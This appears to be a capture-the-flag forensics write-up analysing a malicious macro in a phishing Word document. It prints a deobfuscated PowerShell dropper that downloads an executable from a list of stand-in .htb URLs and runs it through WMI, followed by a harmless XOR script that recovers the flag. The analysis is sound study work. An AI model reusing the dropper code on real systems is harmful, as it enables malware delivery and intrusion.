<h1>
    emo - Forensics, 40pts
</h1>

<h2>
    Claim: This is the first time I dealt with macro analysis and Powershell analysis. Without some keywords from the forum, I wouldn't be able to solve it. Nice challenge though!  
</h2>

<h2>
    Description
</h2>

WearRansom ransomware just got loose in our company. The SOC has traced the initial access to a phishing attack, a Word document with macros. Take a look at the document and see if you can find anything else about the malware and perhaps a flag.
<h2>
    Solution
</h2>

- As the question suggests, we are given a document containing malicous macro. At first, I tried to dump the source code of macro in the document using <code>olevba</code>. However, it had been obfuscated and I had no experience with Powershell analysis so it was very hard to understand the code.
 
![](https://i.imgur.com/CX405Gu.png)

- After spending lots of time on it, I decided to do dynamic analysis. Therefore, I used online sandbox to open and run the file to see what can it do.  

![](https://i.imgur.com/WxyrU5A.png)

- There were 2 processes spawn from the moment I opened the doc. The most malicious one was obviously the hidden <code>powershell.exe</code> which containing encoded payload.(The <code>conhost</code> process just checked the registry key to check the LSA protection)

![](https://i.imgur.com/NVXilIA.png)

- I used cyberchef to decode it. And it was another obfuscated script

![](https://i.imgur.com/DOAV4kJ.png)

- After beautified and deobfuscated it mannually, this is the full script. Basically, this script creates a directory in the home directory, downloads something from those URLs and spawns process. 
```
 SV  0zX ([TyPe]("sYsteM.IO.dIrECtorY")  ) ;
   
set  TxySeo  (  [TYpe]("SYsTEM.NeT.seRVICEpOINTMANaGER")) ;
  
$Nbf5tg3='B9yp90s';

$Vxnlre0=$Cludkjx + '@' + $R6r1tuy;

$Ky3q0e8='Rqdxwo5';

  (  Dir  vaRiAble:0Zx).valuE::"CreATEdIREcTOrY"($HOME + '\Jrbevk4\Ccwr_2h\');

$FN5ggmsH = (182,187,229,146,231,177,151,149,166);

$Pyozgeo='J5fy1cc';

 (  vaRiABLE TxYSEo  ).ValuE::"SecUrITYpROtOcol" = 'Tls12';

$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);

$Huajgb0='Jno5ga1';

$Bb28umo = 'Ale7g_8';


$Hsce_js='Kvnbov_';

$Spk51ue='C7xo9gl';


$Scusbkj=$HOME+'\Jrbevk4\Ccwr_2h\.exe';

$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);

$hbmskV2T='C7xo9gl';

$hbmskV2T=$HOME+'\Jrbevk4\Ccwr_2h\.conf';

$Q1_y05_='W4qvyz8';

$Odb3hf3=&'new-object' Net.WEBclIENt;

$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);

$Anbyt1y='http://da-industrial.htb/js/9IdLP/@WgWhttp://daprofesional.htb/data4/hjTV/@https://dagranitegiare.htb/wp-admin/tV/@http://www.outspokenvisions.htb/wp-includes/aWoM/@http://mobsouk.ht
b/wp-includes/UY30R/@http://biglaughs.htb/smallpotatoes/Y/@https://ngllogistics.htb/adminer/W3mkB/';
  
$Gcoyvlv='Kf_9et1';
foreach ($A8i3ke1 in $Anbyt1y){
	try {
		$Odb3hf3."dOWnLOAdfILe"($A8i3ke1, $Scusbkj);
		$Zhcnaux='Ekkj47t';
		If ((&'Get-Item' $Scusbkj)."LEnGTh" -ge 45199) {${A8I3KE1}.('ToCharArray').Invoke() | .('ForEach-Object') -process 				{ 
			${FN5GGmSh} += ([byte][char]${_} -bxor 0xdf ) 
		};
 		$FN5ggmsH += (228);
 		$b0Rje =  [type]('ConVerT');
   		$B0RjE::"tOBaSE64STRINg"(${fn5ggmsh}) | .('out-file') ${hBmSKV2T};
 		([wmiclass]('win32_Process'))."cReaTE"($Scusbkj);
		$Glwki6a='Imtdxv6';
		break;
		$Pfpblh1='Vslalcu'
		}
	}catch{}
	}
$F47ief2='Bnzidrt'
```
- At this point, I got stuck. I had checked the URLs but none of them was alive. While I seeked for some hints in the forum, there was a comment about <b>"delete all the junks to see what the real thing this script did"</b>. I realised that there was a remaining obfuscated layer in the code itself, not the format of the code.
- I rewrited and modified the code to this script:
```
$list = (182,187,229,146,231,177,151,149,166);

$list += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);

$list += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);

$list += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);


  
$result=("");


foreach ($t in $list){
	try {
		${result}+= [char](${t} -bxor 0xdf ) 
		
	}catch{}
	}
Write-Output $result;
```
- Execute and we got the flag

![](https://i.imgur.com/YUlQyy6.png)
